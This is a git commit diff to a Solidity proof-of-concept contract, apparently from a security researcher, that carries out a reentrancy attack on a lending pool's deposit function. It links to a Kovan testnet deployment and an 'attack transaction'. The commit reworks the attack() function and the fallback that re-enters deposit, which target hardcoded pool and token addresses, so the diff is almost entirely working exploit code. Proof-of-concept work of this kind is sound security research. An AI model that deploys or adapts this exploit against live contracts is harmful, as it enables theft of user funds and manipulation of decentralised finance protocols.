f11a39e6d4fb13f45246419f596e4be2faec37f8
Yehia Tarek <yehia@startfi.io>
2022-05-23 18:07:46 +0200

    ref: clean up sc to make only one reteerant call

--- Umee-Bots/lendingPool-reentrancy/PoC/ReeterancyCallForLendingPool.sol
+++ Umee-Bots/lendingPool-reentrancy/PoC/ReeterancyCallForLendingPool.sol
@@ -1,7 +1,7 @@
 pragma solidity 0.6.12;
 
-// Deployed at https://kovan.etherscan.io/address/0x090827268693f002e0F9b6976dDBCf34b3e40C51
-// Attack Transaction at https://kovan.etherscan.io/tx/0x96c41625872b757a98a4b0d6e646ac6bbb0abc92c694996ece82e1df529a03b0
+// Deployed at https://kovan.etherscan.io/address/0x19e23560bfe7ee15e4c674c9b3b84722b2ed4eb1
+// Attack Transaction at https://kovan.etherscan.io/tx/0xb99b83cb584bb964c10ece6bd9a4505418c0e700192e24839fa9829993425138
 
 interface IERC20 {
     function approve(address spender, uint256 amount) external;
@@ -17,15 +17,13 @@ interface LendingPool {
 }
 
 contract ReeterancyCallForLendingPool {
-    // Fallback is called when DepositFunds sends Ether to this contract.
     fallback() external payable {
-        depositeInternal(true);
-        depositeInternal(true);
-    }
-
-    receive() external payable {
-        depositeInternal(true);
-        depositeInternal(true);
+        LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
+            0xe22da380ee6B445bb8273C81944ADEB6E8450422,
+            1,
+            0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
+            0
+        );
     }
 
     function attack() external payable {
@@ -33,21 +31,13 @@ contract ReeterancyCallForLendingPool {
             0x3526a2fe5dA32d0f0814086848628bF12A1E4417,
             10000000
         );
-        depositeInternal(true);
-        depositeInternal(true);
-        (bool isSent, ) = payable(address(this)).call{value: msg.value}('');
-        require(isSent, 'Failed to send Ether');
-    }
-
-    function depositeInternal(bool beRecursive) internal {
         LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
             0xe22da380ee6B445bb8273C81944ADEB6E8450422,
             1,
             0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
             0
         );
-        if (beRecursive) {
-            depositeInternal(false);
-        }
+        (bool isSent, ) = payable(address(this)).call{value: 0.000001 ether}('');
+        require(isSent, 'Failed to send Ether');
     }
 }
